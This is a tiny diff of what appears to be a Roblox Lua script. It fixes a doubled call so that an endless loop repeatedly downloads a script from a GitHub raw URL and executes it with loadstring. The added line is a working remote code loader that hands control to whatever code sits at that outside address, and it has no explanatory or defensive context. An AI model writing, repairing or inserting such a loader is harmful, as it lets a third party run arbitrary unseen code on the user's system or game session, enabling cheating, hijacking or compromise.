@@ -1,4 +1,4 @@
 while true do
-  loadstring(game:HttpGet(loadstring(game:HttpGet("https://raw.githubusercontent.com/LocalScripte/test/main/newtestcontrol"))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/LocalScripte/test/main/newtestcontrol"))()
    wait(0.00001)
 end
